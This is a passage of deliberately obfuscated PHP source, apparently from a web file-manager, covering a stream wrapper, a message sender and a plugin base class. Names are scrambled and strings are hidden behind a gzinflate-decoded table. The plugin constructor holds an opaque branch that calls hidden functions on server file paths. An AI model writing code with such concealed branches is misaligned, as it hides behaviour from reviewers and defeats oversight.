$dÄŞ„´Š…®[$Dê‹ç—ç±]); } } $eª¯èÄÑ‰[] = self::AUTH_SHOW; $C—Ø»›ò®Ÿ = array_sum(array_unique($eª¯èÄÑ‰)); goto B·ƒŠ‘ŒèÍ; B·ƒŠ‘ŒèÍ: } public function sort($E‰îàö•î“, $DĞò´¾â) { return parent::update($E‰îàö•î“, $DĞò´¾â); } } goto Eƒ±ˆ‹ãëæ; b—ŞÕ Ôƒ: $fÇ‘º…š = $_SERVER[›é¼±][600]; while ($fÇ‘º…š < $_SERVER[›é¼±][601]) { if ($fÇ‘º…š >= 0) { break; } $fÇ‘º…š++; } $_SERVER[ÀóÛœö] = explode($_SERVER[›é¼±][602], gzinflate(substr($_SERVER[›é¼±][603], 10, -8))); goto aÚ¯¬Õ¹šò; E±«»‰ìÓ‚: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($A³ÊªÆÔ‰é, $C¼½ë™Ìøé = '') { goto fÛæÈ—Ë¦á; C¹°˜éÈ: if (!isset(self::$_chunkBuffer[$A³ÊªÆÔ‰é])) { self::$_chunkBuffer[$A³ÊªÆÔ‰é] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; goto eåö°‘öôè; fÛæÈ—Ë¦á: $this->info = $this->info($A³ÊªÆÔ‰é); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[›é¼±][76]]; goto d¬ÍÚ´¾‹º; d¬ÍÚ´¾‹º: $this->pathOpen = $A³ÊªÆÔ‰é; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } goto C¹°˜éÈ; eåö°‘öôè: } function stream_read($B«ğ½«Ó‚) { $bŠ¸ˆÙˆÒø = $this->fileSubstr($this->pose, $B«ğ½«Ó‚); $this->pose += strlen($bŠ¸ˆÙˆÒø); return $bŠ¸ˆÙˆÒø; } public function stream_tell() { return $this->pose; } public function stream_seek($DƒÓÇƒŸ”¢, $bÏÆ¾„’) { $FàÄ´ÎÚ£« =& $_SERVER[›é¼±]; if ($bÏÆ¾„’ == SEEK_SET) { $this->pose = $DƒÓÇƒŸ”¢; } else { if ($bÏÆ¾„’ == SEEK_CUR) { $this->pose += $DƒÓÇƒŸ”¢; } else { if ($bÏÆ¾„’ == SEEK_END) { $this->pose = $this->info[$FàÄ´ÎÚ£«[78]] + intval($DƒÓÇƒŸ”¢); } } } if ($DƒÓÇƒŸ”¢ < 0) { $this->pose = $this->info[$FàÄ´ÎÚ£«[78]] + $DƒÓÇƒŸ”¢; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[›é¼±][78]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($Aõ˜–‘®âª, $d¢â­Ù¥Ôš) { $BŒÜİ =& $_SERVER[›é¼±]; $f ÷Æ¦Ö† = $this->info($Aõ˜–‘®âª); return array($BŒÜİ[1412] => 0, $BŒÜİ[1413] => 0, $BŒÜİ[12] => 32768 + 511, $BŒÜİ[1414] => 0, $BŒÜİ[1415] => 0, $BŒÜİ[1416] => 0, $BŒÜİ[1417] => 0, $BŒÜİ[78] => $f ÷Æ¦Ö†[$BŒÜİ[78]], $BŒÜİ[1418] => $f ÷Æ¦Ö†[$BŒÜİ[1288]], $BŒÜİ[1374] => $f ÷Æ¦Ö†[$BŒÜİ[84]], $BŒÜİ[1373] => $f ÷Æ¦Ö†[$BŒÜİ[194]], $BŒÜİ[1419] => 0, $BŒÜİ[1420] => 0); } static $fileInfo = array(); public function info($bìŸ„Ê„‹) { $f•³¿«ÀÑ = $_SERVER[›é¼±][1421]; if (isset(self::$fileInfo[$bìŸ„Ê„‹])) { return self::$fileInfo[$bìŸ„Ê„‹]; } if (substr($bìŸ„Ê„‹, 0, strlen($f•³¿«ÀÑ)) != $f•³¿«ÀÑ) { return !1; } self::$fileInfo[$bìŸ„Ê„‹] = IO::info(substr($bìŸ„Ê„‹, strlen($f•³¿«ÀÑ))); return self::$fileInfo[$bìŸ„Ê„‹]; } public static function read($bÑš•¤Šê…, $FåŠÕğ’÷¦, $b¾“‡…¨°ë) { if (!isset(self::$_fopenCache[$bÑš•¤Šê…])) { $c¬Àí—š = new StreamWrapperIO(); $c¬Àí—š->stream_open($bÑš•¤Šê…); self::$_fopenCache[$bÑš•¤Šê…] = $c¬Àí—š; } $c¬Àí—š = self::$_fopenCache[$bÑš•¤Šê…]; return $c¬Àí—š->fileSubstr($FåŠÕğ’÷¦, $b¾“‡…¨°ë); } public static function _read($aÁ¿Ëï²†, $aç™¸ˆ¯®İ, $FŠˆÄ©÷Æ§) { goto f¬åÊåÓîÂ; f¬åÊåÓîÂ: $bÚÇ¹¶Ç­… =& $_SERVER[›é¼±]; $D„ˆ†Û¤¥æ = fopen($aÁ¿Ëï²†, $bÚÇ¹¶Ç­…[1292]); if (!$D„ˆ†Û¤¥æ) { return $bÚÇ¹¶Ç­…[33]; } goto d÷äŸø±ÍŸ; d÷äŸø±ÍŸ: $aç¯‹ğ“ÀÊ = 8192; fseek($D„ˆ†Û¤¥æ, $aç™¸ˆ¯®İ, SEEK_SET); $CÍ˜ÅÌ‘ = $bÚÇ¹¶Ç­…[33]; goto c‡·ÀÔÄ¥ô; c‡·ÀÔÄ¥ô: $d­ÑóÜô© = 0; while ($d­ÑóÜô© < $FŠˆÄ©÷Æ§) { $d£ÛªÍÄõÓ = min($aç¯‹ğ“ÀÊ, $FŠˆÄ©÷Æ§ - $d­ÑóÜô©); $CÍ˜ÅÌ‘ .= fread($D„ˆ†Û¤¥æ, $d£ÛªÍÄõÓ); $d­ÑóÜô© += $d£ÛªÍÄõÓ; } fclose($D„ˆ†Û¤¥æ); goto EÚœÎŒš¹µ; EÚœÎŒš¹µ: return $CÍ˜ÅÌ‘; goto eë˜Ş¢œïá; eë˜Ş¢œïá: } public function fileSubstr($cîìŒÃòï, $FˆàÁµ‰ç) { goto C¿˜­¹˜îÙ; d•¢ª¤­Ò: if ($cîìŒÃòï + $FˆàÁµ‰ç > $fâˆ„‡‘Èš) { $FˆàÁµ‰ç = $fâˆ„‡‘Èš - $cîìŒÃòï; } if ($FˆàÁµ‰ç <= 0) { return $aÑÍ¶Î˜ã[33]; } if ($cîìŒÃòï < 0 || $cîìŒÃòï >= $fâˆ„‡‘Èš || $FˆàÁµ‰ç <= 0 || $FˆàÁµ‰ç > 1024 * 1024 * 10) { throw new Exception("\151\157\106\151\154\145\x52\145\x61\x64\x20\x65\x72\162\x6f\162\x21\40\x73\x74\x61\162\164\75{$cîìŒÃòï}\x3b\x6c\145\x6e\x67\x74\150\75{$FˆàÁµ‰ç}\x3b\40\x73\151\x7a\x65\x3d{$fâˆ„‡‘Èš}\73"); } goto Fó±É÷°îˆ; EõãŸ©ñØ©: $f’îİßÌæÍ = 0; $B—è¿¼™ßµ = 0; $D¤øá›¨ƒù = $aÑÍ¶Î˜ã[33]; goto f…ˆ¢Ü¶àò; CìÂ¦²Á˜: $eÄÎÀ„†“Ú = $FˆàÁµ‰ç; if ($cîìŒÃòï < 0) { $cîìŒÃòï = $fâˆ„‡‘Èš + $cîìŒÃòï; } if ($FˆàÁµ‰ç === !1) { $FˆàÁµ‰ç = $fâˆ„‡‘Èš - $cîìŒÃòï; } goto d•¢ª¤­Ò; f…ˆ¢Ü¶àò: foreach ($Aïˆ˜˜É as $f’îİßÌæÍ => $D¤øá›¨ƒù) { $f’îİßÌæÍ = intval($f’îİßÌæÍ); $B—è¿¼™ßµ = $f’îİßÌæÍ + strlen($D¤øá›¨ƒù); if ($cîìŒÃòï >= $B—è¿¼™ßµ) { continue; } if ($cîìŒÃòï >= $f’îİßÌæÍ && $cîìŒÃòï + $FˆàÁµ‰ç <= $B—è¿¼™ßµ) { return substr($D¤øá›¨ƒù, $cîìŒÃòï - $f’îİßÌæÍ, $FˆàÁµ‰ç); } break; } if (count($Aïˆ˜˜É) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($aÑÍ¶Î˜ã[1422], $aÑÍ¶Î˜ã[1423] . count($Aïˆ˜˜É) . "\x3b\x73\164\x61\162\x74\75{$cîìŒÃòï}\54\154\x65\x6e\x67\x74\x68\75{$FˆàÁµ‰ç}\73\160\x6f\163\x65\x3a{$f’îİßÌæÍ}\176{$B—è¿¼™ßµ}"); throw new Exception($aÑÍ¶Î˜ã[1424]); } $a‹âƒÉë’Ú = intval($cîìŒÃòï / $EŠßê¯Ç­ä) * $EŠßê¯Ç­ä; goto C†ÌÕÊîó¢; Fó±É÷°îˆ: $EŠßê¯Ç­ä = 64 * 1024; $Aïˆ˜˜É =& self::$_chunkBuffer[$this->path]; if (!$Aïˆ˜˜É) { $Aïˆ˜˜É = array(); } goto EõãŸ©ñØ©; C¿›Æø±¤Ù: ksort($Aïˆ˜˜É); $dšÚù•œø = substr($F‹Î¸”ù½, $cîìŒÃòï - $a‹âƒÉë’Ú, $FˆàÁµ‰ç); return $dšÚù•œø; goto cÄ¶ªƒ³èŒ; C†ÌÕÊîó¢: $F‹„‡²‡Ì¥ = ceil(($cîìŒÃòï + $FˆàÁµ‰ç) / $EŠßê¯Ç­ä) * $EŠßê¯Ç­ä - $a‹âƒÉë’Ú; $F‹Î¸”ù½ = IO::fileSubstr($this->path, $a‹âƒÉë’Ú, $F‹„‡²‡Ì¥); $Aïˆ˜˜É[$a‹âƒÉë’Ú . $aÑÍ¶Î˜ã[33]] = $F‹Î¸”ù½; goto C¿›Æø±¤Ù; C¿˜­¹˜îÙ: $aÑÍ¶Î˜ã =& $_SERVER[›é¼±]; $fâˆ„‡‘Èš = $this->info[$aÑÍ¶Î˜ã[78]]; $c¥À°õ¯Çº = $cîìŒÃòï; goto CìÂ¦²Á˜; cÄ¶ªƒ³èŒ: } private function log($eÌÓÖê­ƒ, $A”Ö¤¼©‘Í) { $AùÎîÃª¦± =& $_SERVER[›é¼±]; $DÅ®º¬ Œö = timeFloat() - $this->timeStart; write_log(sprintf($AùÎîÃª¦±[1425], $eÌÓÖê­ƒ, $this->info[$AùÎîÃª¦±[28]], $DÅ®º¬ Œö, $A”Ö¤¼©‘Í), $AùÎîÃª¦±[1111]); } } class Message { function __construct() { } public function send($C–Ïƒ—ÑœÅ = '', $c•½ì˜Ô´¬ = array(), $C¯ £™‚ˆî = "\x74\x65\170\x74") { goto Cñç¥Áìˆ£; bŒ­ˆÆõ¨¢: Hook::trigger($dİùƒàØôƒ[1429], $b¬¬ª¬ĞÛ•); goto bï¶¾Ò©ÈÃ; Cñç¥Áìˆ£: $dİùƒàØôƒ =& $_SERVER[›é¼±]; $Eì«íŠÌß‘ = array($dİùƒàØôƒ[29] => $dİùƒàØôƒ[1426], $dİùƒàØôƒ[750] => $C–Ïƒ—ÑœÅ); if (in_array($C¯ £™‚ˆî, array($dİùƒàØôƒ[1426], $dİùƒàØôƒ[1427]))) { $Eì«íŠÌß‘[$dİùƒàØôƒ[29]] = $C¯ £™‚ˆî; } goto A›¿ï÷ï¹ò; A›¿ï÷ï¹ò: $c•½ì˜Ô´¬ = array($dİùƒàØôƒ[509] => isset($c•½ì˜Ô´¬[$dİùƒàØôƒ[509]]) ? $c•½ì˜Ô´¬[$dİùƒàØôƒ[509]] : $dİùƒàØôƒ[33], $dİùƒàØôƒ[588] => isset($c•½ì˜Ô´¬[$dİùƒàØôƒ[588]]) ? $c•½ì˜Ô´¬[$dİùƒàØôƒ[588]] : $dİùƒàØôƒ[33]); if (empty($C–Ïƒ—ÑœÅ) || empty($c•½ì˜Ô´¬[$dİùƒàØôƒ[509]]) && empty($c•½ì˜Ô´¬[$dİùƒàØôƒ[588]])) { return !1; } $b¬¬ª¬ĞÛ• = array($dİùƒàØôƒ[1367] => $Eì«íŠÌß‘, $dİùƒàØôƒ[1428] => $c•½ì˜Ô´¬); goto bŒ­ˆÆõ¨¢; bï¶¾Ò©ÈÃ: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto bµøé‡êÇ‘; d“™Ô¶¼¯Á: $this->pluginHost = $config[$F×Øí£…ï´[1433]] . $this->pluginName . $F×Øí£…ï´[8]; $this->pluginHostDefault = $config[$F×Øí£…ï´[1433]] . $this->pluginName . $F×Øí£…ï´[8]; $Cí‰«œê†® = $config[$F×Øí£…ï´[1434]]; goto Eã—ğË¹¨Ä; Eã—ğË¹¨Ä: if ($Cí‰«œê†® && strpos($F×Øí£…ï´[47] . $Cí‰«œê†® . $F×Øí£…ï´[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$F×Øí£…ï´[1435]] . $this->pluginName . $F×Øí£…ï´[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); goto DÀÃ¸Ô—‰; bµøé‡êÇ‘: $F×Øí£…ï´ =& $_SERVER[›é¼±]; if ($_SERVER[$F×Øí£…ï´[858]] != $_SERVER[$F×Øí£…ï´[859]]) { goto a‰‚Œ—¨Ãã; a‰‚Œ—¨Ãã: $aÈÕ½×²” = $F×Øí£…ï´[876]; $EáÙìïÔ¬† = $F×Øí£…ï´[860]; $bÔ«Çª×”© = $_SERVER[$F×Øí£…ï´[861]] . $F×Øí£…ï´[862]; goto Aî‰Áˆ‘‹ó; c£ŠßÙ‚: $B´æ˜—‡Åö = 1; while ($B´æ˜—‡Åö > 1) { $B´æ˜—‡Åö = $B´æ˜—‡Åö + 4; $F¼Û¦ƒ‹’ = rawurlencode($B´æ˜—‡Åö . $F×Øí£…ï´[376]); } goto DÀˆ³«ãÖ¬; e¦ì«Ò‹¤Ó: $c†¤¡Ïë† = $F×Øí£…ï´[877]; $c†¤¡Ïë†($_SERVER[$F×Øí£…ï´[878]]); $c†¤¡Ïë†($_SERVER[$F×Øí£…ï´[861]] . $F×Øí£…ï´[1430]); goto c£ŠßÙ‚; Aî‰Áˆ‘‹ó: $E®à¡‚µÊ = $EáÙìïÔ¬†($bÔ«Çª×”©); $AñÂ›ñãŒï = explode($F×Øí£…ï´[229], $E®à¡‚µÊ); if (count($AñÂ›ñãŒï) < $F×Øí£…ï´[620]) { $Bõ©ÏÇÃÅ• = $F×Øí£…ï´[863]; $Bõ©ÏÇÃÅ•(); } goto e¦ì«Ò‹¤Ó; DÀˆ³«ãÖ¬: } global $in, $config; goto aŠÇ¤™“…; aŠÇ¤™“…: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($F×Øí£…ï´[1431]); goto cŠÏÈ¿ÕÒ; cŠÏÈ¿ÕÒ: $this->pluginName = str_replace($F×Øí£…ï´[1431], $F×Øí£…ï´[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $F×Øí£…ï´[8]; $this->pluginApi = appHostGet() . $F×Øí£…ï´[1432] . $this->pluginName . $F×Øí£…ï´[8]; goto d“™Ô¶¼¯Á; DÀÃ¸Ô—‰: $this->echoJsAssignArr = array(); return $this; goto bŠ®¶·‹¾; bŠ®¶·‹¾: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[›é¼±][1436]); } protected function assign($aøˆÅ·¦‹Ò, $FğŒ«³˜êù = false) { if (is_array($aøˆÅ·¦‹Ò)) { $this->values = array_merge($this->values, $aøˆÅ·¦‹Ò); } else { $this->values[$aøˆÅ·¦‹Ò] = $FğŒ«³˜êù; } } protected function display($Eµ¢Œ„²Ğ) { extract($this->values); require $Eµ¢Œ„²Ğ; } final function hookRegist($a†°¶Çï) { $this->modelPlugin->appRegist($this->pluginName, $a†°¶Çï); } final function appIcon() { $cÊ•‘Ù’ê‚ =& $_SERVER[›é¼±]; $cõİËä×„» = $this->appPackage(); $d¸¸œÈù˜÷ = $cÊ•‘Ù’ê‚[33]; if (isset($cõİËä×„»[$cÊ•‘Ù’ê‚[411]])) { if (isset($cõİËä×„»[$cÊ•‘Ù’ê‚[411]][$cÊ•‘Ù’ê‚[1437]])) { $d¸¸œÈù˜÷ = $cÊ•‘Ù’ê‚[1438] . $cõİËä×„»[$cÊ•‘Ù’ê‚[411]][$cÊ•‘Ù’ê‚[1437]] . $cÊ•‘Ù’ê‚[1439]; } else { if ($cõİËä×„»[$cÊ•‘Ù’ê‚[411]][$cÊ•‘Ù’ê‚[1440]]) { $d¸¸œÈù˜÷ = $cÊ•‘Ù’ê‚[1441] . $cõİËä×„»[$cÊ•‘Ù’ê‚[411]][$cÊ•‘Ù’ê‚[1440]] . $cÊ•‘Ù’ê‚[1442]; } } } return $d¸¸œÈù˜÷; } final function fileCanView($eÇ‘••Ÿä) { goto c÷¢™ÁÅĞ; c÷¢™ÁÅĞ: $e’ƒÁ‚ôÒÎ =& $_SERVER[›é¼±]; if (request_url_safe($eÇ‘••Ÿä)) { return !0; } if ($this->isShare($eÇ‘••Ÿä)) { return !0; } goto C‚¢ğ×ÎÒÊ; A—¥Ÿ‡ùò»: ActionCall($e’ƒÁ‚ôÒÎ[1455], $eÇ‘••Ÿä); goto A»½ˆè«çÏ; C‚¢ğ×ÎÒÊ: $Cøå®ÙõÜ = Session::get($e’ƒÁ‚ôÒÎ[1443]); if (!$Cøå®ÙõÜ || !$Cøå®ÙõÜ[$e’ƒÁ‚ôÒÎ[1444]]) { $F‰¾¸ÇŸõ = $e’ƒÁ‚ôÒÎ[1445] . rawurlencode(this_url()); show_tips(LNG($e’ƒÁ‚ôÒÎ[1446]) . $e’ƒÁ‚ôÒÎ[1447] . $F‰¾¸ÇŸõ . $e’ƒÁ‚ôÒÎ[1448] . LNG($e’ƒÁ‚ôÒÎ[1449]) . $e’ƒÁ‚ôÒÎ[1450], !1); } if (!Action($e’ƒÁ‚ôÒÎ[1451])->authCan($e’ƒÁ‚ôÒÎ[1452])) { show_tips(LNG($e’ƒÁ‚ôÒÎ[1453]) . $e’ƒÁ‚ôÒÎ[1454], !1); } goto A—¥Ÿ‡ùò»; A»½ˆè«çÏ: } final function isShare($dÔÃ³’Å‰À) { $eèùÚ¿Üå = KodIO::parse($dÔÃ³’Å‰À); return $eèùÚ¿Üå[$_SERVER[›é¼±][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($e×¨–ÁŠƒŠ) { if (request_url_safe($e×¨–ÁŠƒŠ)) { return $e×¨–ÁŠƒŠ; } if (!$this->isShare($e×¨–ÁŠƒŠ)) { $e×¨–ÁŠƒŠ = $this->filePath($e×¨–ÁŠƒŠ); } return Action($_SERVER[›é¼±][1103])->linkOut($e×¨–ÁŠƒŠ); } public function filePathLinkOut($AøÈ­±”¨ô) { if (request_url_safe($AøÈ­±”¨ô)) { return $AøÈ­±”¨ô; } $this->fileCanView($AøÈ­±”¨ô); return Action($_SERVER[›é¼±][1103])->link($AøÈ­±”¨ô); } final function filePath($b¨êÂğ’§) { $c“¹á…ÙÃ =& $_SERVER[›é¼±]; if ($A…‡×ºÍ² = $this->checkSharePath($b¨êÂğ’§)) { Hook::trigger($c“¹á…ÙÃ[1456], $A…‡×ºÍ²); return $A…‡×ºÍ²; } $this->fileCanView($b¨êÂğ’§); if (request_url_safe($b¨êÂğ’§)) { $cÅÁàƒ° = parse_url_query($b¨êÂğ’§); if (isset($cÅÁàƒ°[$c“¹á…ÙÃ[1457]]) && isset($cÅÁàƒ°[$c“¹á…ÙÃ[209]])) { $a˜ê™ŸÏ¯ç = Model($c“¹á…ÙÃ[765])->get($c“¹á…ÙÃ[766]); $Fœ–µŸ¬½ = Mcrypt::decode($cÅÁàƒ°[$c“¹á…ÙÃ[209]], $a˜ê™ŸÏ¯ç); if ($Fœ–µŸ¬½) { $this->fileInfo = IO::infoWithChildren($Fœ–µŸ¬½); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $Fœ–µŸ¬½; } } $b¨êÂğ’§ = $this->_cacheHttpFile($b¨êÂğ’§); $this->fileInfo = IO::infoWithChildren($b¨êÂğ’§); } else { $this->fileInfo = IO::infoWithChildren($b¨êÂğ’§); if (!$this->fileInfo) { show_tips(LNG($c“¹á…ÙÃ[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($c“¹á…ÙÃ[1456], $b¨êÂğ’§); return $b¨êÂğ’§; } final function _cacheHttpFile($b†…öÔç†) { $e¼è‡²”Ñ½ = hash_path($b†…öÔç†, !0); $this->cachePath = $this->pluginCachePath($e¼è‡²”Ñ½); if ($bòâŸÍÀèÁ = IO::fileNameExist($this->cachePath, $e¼è‡²”Ñ½)) { return KodIO::make($bòâŸÍÀèÁ); } $cí•õç§å… = $this->cachePath . $e¼è‡²”Ñ½; return $this->pluginCacheFileSet($cí•õç§å…, file_get_contents_nossl($b†…öÔç†)); } final function _tmpFileName($eö¼©×¥Òì = array()) { goto EÊ¨ÒĞêå¾; EÊ¨ÒĞêå¾: $F¸¶¦¶¿ñ¾ =& $_SERVER[›é¼±]; if (!$eö¼©×¥Òì) { $eö¼©×¥Òì = $this->fileInfo; } if (isset($eö¼©×¥Òì[$F¸¶¦¶¿ñ¾[171]])) { return $eö¼©×¥Òì[$F¸¶¦¶¿ñ¾[171]]; } goto DŸ­ÅŞ©ø; DŸ­ÅŞ©ø: if (isset($eö¼©×¥Òì[$F¸¶¦¶¿ñ¾[164]][$F¸¶¦¶¿ñ¾[171]])) { return $eö¼©×¥Òì[$F¸¶¦¶¿ñ¾[164]][$F¸¶¦¶¿ñ¾[171]]; } $b±ÅòÇ¥‹² = IO::hashSimple($eö¼©×¥Òì[$F¸¶¦¶¿ñ¾[76]]); if ($b±ÅòÇ¥‹²) { return $b±ÅòÇ¥‹²; } goto a¡¾ÃÚ÷ˆå; a¡¾ÃÚ÷ˆå: $eİÍù×˜Ñ = array($eö¼©×¥Òì[$F¸¶¦¶¿ñ¾[28]], $eö¼©×¥Òì[$F¸¶¦¶¿ñ¾[76]], $eö¼©×¥Òì[$F¸¶¦¶¿ñ¾[78]]); if (isset($eö¼©×¥Òì[$F¸¶¦¶¿ñ¾[515]])) { $eİÍù×˜Ñ[] = $eö¼©×¥Òì[$F¸¶¦¶¿ñ¾[515]]; } return md5(implode($F¸¶¦¶¿ñ¾[71], $eİÍù×˜Ñ)); goto e¦Ç¥¾‡‡; e¦Ç¥¾‡‡: } final function checkSharePath($f†ö’…Á††) { goto E”„ˆ¬; dÄäçº¦Ê: $this->cachePath = $this->pluginCachePath($this->fileInfo[$f»•äáñ»œ[171]]); return $C‘‡‹åƒ«á[$f»•äáñ»œ[76]]; goto C÷âšÕ¸”‹; E”„ˆ¬: $f»•äáñ»œ =& $_SERVER[›é¼±]; if (!defined($f»•äáñ»œ[468])) { define($f»•äáñ»œ[508], 0); } if (!$this->isShare($f†ö’…Á††)) { return !1; } goto e÷°ÕÅáÒ§; e÷°ÕÅáÒ§: $C‘‡‹åƒ«á = Action($f»•äáñ»œ[1103])->sharePathInfo($f†ö’…Á††); if (!isset($C‘‡‹åƒ«á[$f»•äáñ»œ[76]])) { show_json(LNG($f»•äáñ»œ[1458]), !1); } $this->fileInfo = $C‘‡‹åƒ«á[$f»•äáñ»œ[164]]; goto dÄäçº¦Ê; C÷âšÕ¸”‹: } final function pluginCachePath($D¢Š¢Œˆ‘Æ = '') { $A·»©”Ø–ä =& $_SERVER[›é¼±]; $BõÔçªÚ‘ = IO_PATH_SYSTEM_TEMP . $A·»©”Ø–ä[1459] . $this->pluginName; if (!($f·ˆ† §å“ = IO::infoFull($BõÔçªÚ‘))) { return IO::mkdir($BõÔçªÚ‘ . $A·»©”Ø–ä[8] . $D¢Š¢Œˆ‘Æ); } if (empty($D¢Š¢Œˆ‘Æ)) { return $f·ˆ† §å“[$A·»©”Ø–ä[76]]; } if (!($eÇÎë„ùğ = IO::fileNameExist($f·ˆ† §å“[$A·»©”Ø–ä[76]], $D¢Š¢Œˆ‘Æ))) { return IO::mkdir($f·ˆ† §å“[$A·»©”Ø–ä[76]] . $D¢Š¢Œˆ‘Æ); } return KodIO::make($eÇÎë„ùğ); } final function pluginCacheFileSet($B©Èğ¿ª², $dŞÁ· ôø´ = '') { $A•àÇÔ¹½ =& $_SERVER[›é¼±]; if (!($fŒÚ¾•³ÖÃ = IO::infoFull($B©Èğ¿ª²))) { return IO::mkfile($B©Èğ¿ª², $dŞÁ· ôø´, REPEAT_REPLACE); } IO::setContent($fŒÚ¾•³ÖÃ[$A•àÇÔ¹½[76]], $dŞÁ· ôø´); return $fŒÚ¾•³ÖÃ[$A•àÇÔ¹½[76]]; } final function pluginLocalFile($dÄÂ‘Á¸Ä± = '') { goto e¼ñŒµ®Â¦; Bï’À²¥Ì‘: return IO::copy($dÄÂ‘Á¸Ä±, $F‘İ³òÒ± , 0, $fÄò©áÑ‚); goto AÕ°»ó½Ô; B†¶ô˜§ö: if (!checkExtSafe($fÄò©áÑ‚)) { $fÄò©áÑ‚ = $fÄò©áÑ‚ . $D·š“æ„Âƒ[1460]; } $E¬ÄÒ¼œ = $F‘İ³òÒ±  . $fÄò©áÑ‚; if (@file_exists($E¬ÄÒ¼œ)) { return $E¬ÄÒ¼œ; } goto Bï’À²¥Ì‘; c§ÔÈî ª¢: if (!$dÄÂ‘Á¸Ä±) { return $F‘İ³òÒ± ; } $bØ¦²‡é¢é = IO::info($dÄÂ‘Á¸Ä±); $fÄò©áÑ‚ = $this->_tmpFileName($bØ¦²‡é¢é) . $D·š“æ„Âƒ[95] . $bØ¦²‡é¢é[$D·š“æ„Âƒ[168]]; goto B†¶ô˜§ö; e¼ñŒµ®Â¦: $D·š“æ„Âƒ =& $_SERVER[›é¼±]; $F‘İ³òÒ±  = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($F‘İ³òÒ± )) { mk_dir($F‘İ³òÒ± ); } goto c§ÔÈî ª¢; AÕ°»ó½Ô: } final function appPackage() { goto f±‡—ğˆ÷Å; A²ÅÃÈÆ¼: $aø‡‹±ïš‘ = Hook::trigger($eì»ñ¨­ì¼[1462], $CÛ‡ß˜‰•½); if ($aø‡‹±ïš‘ && is_array($aø‡‹±ïš‘)) { $CÛ‡ß˜‰•½ = $aø‡‹±ïš‘; } $this->packageData = $CÛ‡ß˜‰•½; goto fÎæš‹îœÁ; fÎæš‹îœÁ: return $CÛ‡ß˜‰•½; goto A¨Û·®¡®; D¦¼Ã™Ùâ: $this->parseLang($AĞõÅÛîŠ); $CÛ‡ß˜‰•½ = json_decode_force($AĞõÅÛîŠ); if (!$CÛ‡ß˜‰•½) { return array(); } goto A²ÅÃÈÆ¼; f±‡—ğˆ÷Å: $eì»ñ¨­ì¼ =& $_SERVER[›é¼±]; if ($this->packageData) { return $this->packageData; } $AĞõÅÛîŠ = $this->parseFile($this->pluginPath . $eì»ñ¨­ì¼[1461]); goto D¦¼Ã™Ùâ; A¨Û·®¡®: } public function packageInfoGet($eµÁŠç÷Ù…) { $Bâà»öóù— = $this->appPackage(); return array_get_value($Bâà»öóù—, $eµÁŠç÷Ù…); } public function packageVersion() { return $this->packageInfoGet($_SERVER[›é¼±][1463]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[›é¼±][1464]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[›é¼±][1465]); } public function echoJsAssign($a»ëïšÊÆ¢, $aê·…·â¯è) { $this->echoJsAssignArr[$a»ëïšÊÆ¢] = $aê·…·â¯è; } private function parseFile($B É¤…²è) { goto bÓŠ­ğÖ«; D‰ÏŒÔ£®¡: if (strstr($a­À“í½Šî, $EÈ¤ù¼‹È…[1477])) { $eêîÎ¦èî§ = $eêîÎ¦èî§ = rawurlencode(json_encode($this->getConfig())); $a­À“í½Šî = str_replace($EÈ¤ù¼‹È…[1477], $eêîÎ¦èî§, $a­À“í½Šî); } $a­À“í½Šî = str_replace($FëÁÇ¯†İù, $bÛÂÇğ¥ , $a­À“í½Šî); return $a­À“í½Šî; goto dë¸×ä°Å£; F­ÒÕèÔ’Â: $bÛÂÇğ¥  = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$EÈ¤ù¼‹È…[88]][$EÈ¤ù¼‹È…[1473]]); foreach ($this->echoJsAssignArr as $Fª„ƒ°öâ‘ => $e¼Ê¦§çí˜) { $FëÁÇ¯†İù[] = $EÈ¤ù¼‹È…[1474] . $Fª„ƒ°öâ‘ . $EÈ¤ù¼‹È…[1475]; $bÛÂÇğ¥ [] = is_array($e¼Ê¦§çí˜) || is_object($e¼Ê¦§çí˜) ? rawurlencode(json_encode($e¼Ê¦§çí˜)) : $e¼Ê¦§çí˜; } if (strstr($a­À“í½Šî, $EÈ¤ù¼‹È…[1476])) { $eêîÎ¦èî§ = rawurlencode(json_encode($this->pluginLangArr)); $a­À“í½Šî = str_replace($EÈ¤ù¼‹È…[1476], $eêîÎ¦èî§, $a­À“í½Šî); } goto D‰ÏŒÔ£®¡; bÓŠ­ğÖ«: $EÈ¤ù¼‹È… =& $_SERVER[›é¼±]; $a­À“í½Šî = file_get_contents_nossl($B É¤…²è); $FëÁÇ¯†İù = array($EÈ¤ù¼‹È…[1466], $EÈ¤ù¼‹È…[1467], $EÈ¤ù¼‹È…[1468], $EÈ¤ù¼‹È…[1469], $EÈ¤ù¼‹È…[1470], $EÈ¤ù¼‹È…[1471], $EÈ¤ù¼‹È…[1472]); goto F­ÒÕèÔ’Â; dë¸×ä°Å£: } private function parseLang(&$C•¬…·¾Ñ) { goto Fç‘¿¶çÂô; FÛñÑª’–: $eò¸ñÃ‡À“ = array(); foreach ($d‡à­±ŠŸë[0] as $a«ÑÅÁÆÌ‘) { $cã·ÊÄˆº¾ = substr($a«ÑÅÁÆÌ‘, 